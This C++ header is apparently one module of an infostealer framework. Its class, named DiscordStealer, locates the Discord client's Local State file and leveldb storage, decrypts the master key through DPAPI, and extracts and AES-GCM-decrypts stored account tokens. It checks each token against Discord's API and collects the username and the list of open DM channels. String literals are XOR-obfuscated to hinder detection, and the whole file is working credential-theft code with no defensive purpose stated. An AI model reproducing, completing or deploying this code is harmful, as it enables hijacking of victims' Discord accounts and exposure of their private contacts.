#pragma once


#include "../crypto.hpp"
#include "../http.hpp"
#include "../result.hpp"
#include "../util.hpp"
#include "../xor.hpp"
#include "base.hpp"
#include <nlohmann/json.hpp>
#include <regex>

class DiscordStealer : public AbstractStealer {
public:
    void steal() override {
        if (!get_token()) return;

        append_extra_info("Discord:");
        append_extra_info("  Token: " + m_token);


        try {
            auto resp = HTTP::get(xor("https://discord.com/api/v9/users/@me"),
                                  {{xor("Authorization"), m_token}});
            if (resp.status == 200) {
                auto user_data = nlohmann::json::parse(resp.body, nullptr, false);
                if (!user_data.is_discarded() && user_data.contains("username")) {
                    append_extra_info("  User: " + user_data["username"].get<std::string>());
                }
            }
        } catch (...) {}


        try {
            auto resp = HTTP::get(xor("https://discord.com/api/v9/users/@me/channels"),
                                  {{xor("Authorization"), m_token}});
            if (resp.status == 200) {
                auto channels = nlohmann::json::parse(resp.body, nullptr, false);
                if (!channels.is_discarded() && channels.is_array()) {
                    append_extra_info("  Open DM channels:");
                    for (auto& ch : channels) {
                        int type = ch.value("type", -1);
                        if (type != 1 && type != 3) continue;
                        std::string channel_id = ch.value("id", "");
                        std::string recipient = "Unknown";
                        if (ch.contains("recipients") && ch["recipients"].is_array() &&
                            !ch["recipients"].empty()) {
                            recipient = ch["recipients"][0].value("username", "Unknown");
                        }
                        append_extra_info("    - " + recipient + " (ID: " + channel_id + ")");
                    }
                }
            }
        } catch (...) {}

        append_extra_info("");
    }

    const std::string& get_validated_token() const { return m_token; }

private:
    std::string m_token;

    bool get_token() {
        char* appdata = nullptr;
        size_t len;
        _dupenv_s(&appdata, &len, xor("APPDATA"));
        if (!appdata) return false;
        std::string appdata_path(appdata);
        free(appdata);


        std::string local_state_path = appdata_path + xor("\\discord\\Local State");
        std::string local_state_content;
        if (read_binary_file(local_state_path, local_state_content) != 0) return false;

        auto local_state = nlohmann::json::parse(local_state_content, nullptr, false);
        if (local_state.is_discarded()) return false;
        if (!local_state.contains("os_crypt") ||
            !local_state["os_crypt"].contains("encrypted_key"))
            return false;

        std::string encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"];
        std::string decoded = crypto::base64_decode_str(encrypted_key_b64);
        if (decoded.size() < 5) return false;
        decoded.erase(0, 5);

        std::string master_key;
        if (crypt_unprotect_data(decoded, master_key) != 0) return false;


        std::string leveldb_path = appdata_path + xor("\\discord\\Local Storage\\leveldb");
        if (!std::filesystem::exists(leveldb_path)) return false;

        std::regex token_regex(xor(R"(dQw4w9WgXcQ:([^\"]+))"));
        std::vector<std::string> found_tokens;

        for (const auto& entry : std::filesystem::directory_iterator(leveldb_path)) {
            if (entry.path().extension() != xor(".ldb") &&
                entry.path().extension() != xor(".log"))
                continue;

            std::string content;
            if (read_binary_file(entry.path(), content) != 0) continue;

            std::smatch match;
            auto search_start = content.cbegin();
            while (std::regex_search(search_start, content.cend(), match, token_regex)) {
                std::string token_b64 = match[1].str();
                std::vector<uint8_t> token_bytes = crypto::base64_decode(token_b64);
                if (token_bytes.size() < 3 + 12 + 16) {
                    search_start = match.suffix().first;
                    continue;
                }


                std::vector<uint8_t> iv(token_bytes.begin() + 3, token_bytes.begin() + 15);
                size_t ct_len = token_bytes.size() - 3 - 12 - 16;
                std::vector<uint8_t> ciphertext(token_bytes.begin() + 15,
                                                 token_bytes.begin() + 15 + ct_len);
                std::vector<uint8_t> tag(token_bytes.end() - 16, token_bytes.end());

                std::vector<uint8_t> plaintext;
                if (crypto::aes_gcm_decrypt(
                        (const uint8_t*)master_key.data(), master_key.size(),
                        iv.data(), iv.size(), tag.data(), tag.size(),
                        ciphertext.data(), ciphertext.size(), plaintext)) {
                    found_tokens.emplace_back(plaintext.begin(), plaintext.end());
                }
                search_start = match.suffix().first;
            }
        }

        if (found_tokens.empty()) return false;


        std::unordered_map<std::string, int> freq;
        for (const auto& t : found_tokens) freq[t]++;

        int max_freq = 0;
        for (const auto& p : freq) if (p.second > max_freq) max_freq = p.second;

        std::vector<std::string> candidates;
        if (max_freq > 1) {
            for (const auto& p : freq)
                if (p.second == max_freq) candidates.push_back(p.first);
        } else {
            for (const auto& t : found_tokens) candidates.push_back(t);
        }


        for (const auto& token : candidates) {
            try {
                auto resp = HTTP::get(xor("https://discord.com/api/v9/users/@me"),
                                      {{xor("Authorization"), token}});
                if (resp.status == 200) {
                    auto user_data = nlohmann::json::parse(resp.body, nullptr, false);
                    if (!user_data.is_discarded() && user_data.contains("username")) {
                        m_token = token;
                        append_discord_token(token);
                        return true;
                    }
                }
            } catch (...) { continue; }
        }

        return false;
    }
};
